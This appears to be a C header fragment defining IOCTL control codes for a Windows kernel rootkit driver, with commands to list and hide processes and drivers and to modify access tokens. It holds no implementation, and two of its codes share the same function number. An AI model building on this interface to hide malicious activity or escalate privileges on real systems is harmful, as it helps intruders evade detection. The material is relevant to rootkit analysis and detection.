//IOCTL's Used
#define FILE_DEVICE_RK 0x00008001
#define IOCTL_TEST_CMD CTL_CODE(FILE_DEVICE_RK, 0x801, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_LIST_TASK CTL_CODE(FILE_DEVICE_RK, 0x801, METHOD_BUFFERED, FILE_WRITE_DATA)
#define IOCTL_LIST_DRVR CTL_CODE(FILE_DEVICE_RK, 0x802, METHOD_BUFFERED, FILE_WRITE_DATA)

#define IOCTL_HIDE_TASK CTL_CODE(FILE_DEVICE_RK, 0x0803, METHOD_BUFFERED, FILE_WRITE_DATA)
#define IOCTL_HIDE_DRVR CTL_CODE(FILE_DEVICE_RK, 0x804, METHOD_BUFFERED, FILE_WRITE_DATA)

#define IOCTL_MOD_TOKEN CTL_CODE (FILE_DEVICE_RK, 0x805 , METHOD_BUFFERED, FILE_WRITE_DATA)